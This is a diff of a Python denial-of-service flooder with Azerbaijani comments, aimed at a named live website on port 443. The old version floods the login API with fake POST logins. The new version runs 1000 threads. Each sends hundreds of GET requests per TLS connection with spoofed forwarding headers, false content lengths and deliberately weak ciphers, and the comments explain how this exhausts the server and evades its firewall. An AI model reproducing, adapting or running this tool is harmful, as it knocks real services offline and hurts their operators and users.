@@ -1,72 +1,72 @@
 import socket
-import ssl
 import threading
 import random
 import string
 import time
+import ssl
 
+# --- ULTRA TARGET ---
 TARGET_HOST = "www.appl88-vip.com"
 TARGET_PORT = 443
-THREADS = 800 # Railway Paid üçün bu rəqəm daha effektivdir
-# Hədəf yol - login API-ni hədəf alırıq (ən ağır hissə)
-TARGET_PATH = "/#/login" 
+THREADS = 1000 # Maksimum güc
 
-def get_random_headers():
-    # Saytı reklam trafiki kimi göstəririk ki, firewall şübhələnməsin
-    ua = f"Mozilla/5.0 (iPhone; CPU iPhone OS {random.randint(15,17)}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
-    forwarded_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
-    
-    payload = (
-        f"POST {TARGET_PATH} HTTP/1.1\r\n"
-        f"Host: {TARGET_HOST}\r\n"
-        f"User-Agent: {ua}\r\n"
-        f"Accept: application/json, text/plain, */*\r\n"
-        f"Content-Type: application/json;charset=UTF-8\r\n"
-        f"X-Forwarded-For: {forwarded_ip}\r\n"
-        f"Referer: https://{TARGET_HOST}/\r\n"
-        f"Connection: keep-alive\r\n"
-        f"Content-Length: {random.randint(100, 500)}\r\n"
-        f"\r\n"
-        f"{'{\"username\":\"' + ''.join(random.choices(string.ascii_lowercase, k=10)) + '\",\"password\":\"' + ''.join(random.choices(string.digits, k=8)) + '\"}'}"
-    ).encode()
-    return payload
+def r_str(n):
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
 def attack():
-    # SSL context-i bir dəfə yarat ki, CPU yorulmasın
+    # SSL context-i daha 'agressiv' tənzimləyirik
     ctx = ssl.create_default_context()
     ctx.check_hostname = False
     ctx.verify_mode = ssl.CERT_NONE
+    # Şifrələmə metodlarını (ciphers) köhnə saxlayırıq ki, serverin CPU-su onları çözmək üçün daha çox güc sərf etsin
+    ctx.set_ciphers('DEFAULT@SECLEVEL=1')
 
     while True:
         try:
+            # TCP bağlantısı
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(5)
+            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1) # Paketləri gecikdirmədən dərhal göndər
+            s.settimeout(3)
             
-            # Bağlantını qur
             conn = ctx.wrap_socket(s, server_hostname=TARGET_HOST)
             conn.connect((TARGET_HOST, TARGET_PORT))
             
-            # "Rapid Fire" - Bir bağlantıdan 50 ağır POST sorğusu
-            for _ in range(50):
-                conn.send(get_random_headers())
-                # Çox qısa gözləmə (Serverin buferini doldurmaq üçün)
-                time.sleep(0.01)
+            # Bu hissə "Massive Header Bombardment" adlanır
+            # Serverin buferini (Buffer) doldurmaq üçün hər bağlantıda 200 ağır paket
+            for i in range(200):
+                # Hər dəfə URL-i dəyişirik ki, Firewall IP-ni robot kimi tanımasın
+                payload = (
+                    f"GET /?v={r_str(50)} HTTP/1.1\r\n"
+                    f"Host: {TARGET_HOST}\r\n"
+                    f"User-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/12{random.randint(0,9)}.0.0.0 Safari/537.36\r\n"
+                    f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\n"
+                    f"X-Forwarded-For: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
+                    f"X-Real-IP: {random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}\r\n"
+                    f"Content-Length: {random.randint(1000, 5000)}\r\n" # Serveri datanı gözləməyə məcbur et
+                    f"\r\n"
+                ).encode()
                 
+                conn.send(payload)
+                # İkinci zərbə: Yarımçıq data göndər
+                conn.send(r_str(10).encode())
+            
+            # Bağlantını bağlama, serverin onu bağlamasını gözlə (Bağlantı limitini doldurur)
+            time.sleep(1)
             conn.close()
         except:
             pass
 
 def main():
-    print(f"🔥 VIP DESTROYER ACTIVATED: {TARGET_HOST}")
-    print("[*] Specializing in API and Login DB exhaustion...")
+    print(f"💀 GLOBAL GENOCIDE STARTED: {TARGET_HOST}")
+    print("[!] Resource Saturaion: All Threads engaged.")
     
     for i in range(THREADS):
         t = threading.Thread(target=attack)
         t.daemon = True
         t.start()
         if i % 100 == 0:
-            print(f"[*] {i} API Flooders deployed...")
-            time.sleep(1)
+            print(f"[*] {i} Heavy Units deployed...")
+            time.sleep(0.1)
 
     while True:
         time.sleep(1)
